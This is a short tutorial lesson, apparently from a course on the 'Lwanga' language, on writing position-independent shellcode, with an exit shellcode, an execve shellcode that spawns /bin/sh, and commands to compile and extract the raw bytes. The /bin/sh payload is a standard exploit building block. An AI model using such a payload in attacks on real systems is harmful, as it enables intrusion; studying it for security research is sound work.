# Lesson 30: Shellcode Basics

**Learn how to write position-independent shellcode.**

---

## What is Shellcode?

Shellcode is small, self-contained code that can run anywhere in memory. Used in exploit development and security research.

---

## Simple Shellcode: Exit

```lwanga
naked fn exit_shellcode() -> u64 {
    asm {
        mov rax, 60      // sys_exit
        xor rdi, rdi     // status = 0
        syscall
    }
}
```

---

## Shellcode: Execute /bin/sh

```lwanga
naked fn execve_shellcode() -> u64 {
    asm {
        xor rax, rax
        push rax
        mov rdi, 0x68732f6e69622f  // "/bin/sh"
        push rdi
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 59  // sys_execve
        syscall
    }
}
```

---

## Position-Independent Code

Compile with `--pic` flag:

```bash
lwangac shellcode.lwanga -o shellcode --pic
```

---

## Extracting Shellcode

```bash
objcopy -O binary -j .text shellcode shellcode.bin
hexdump -v -e '"\\\x" 1/1 "%02x"' shellcode.bin
```

---

## Testing Shellcode

```lwanga
fn main() -> u64 {
    execve_shellcode();
    return 0;
}
```

---

**Navigation**: [← Previous: Encrypted Strings](29-encrypted-strings.md) | [Tutorial Home](README.md) | [Next: Obfuscation →](31-obfuscation.md)
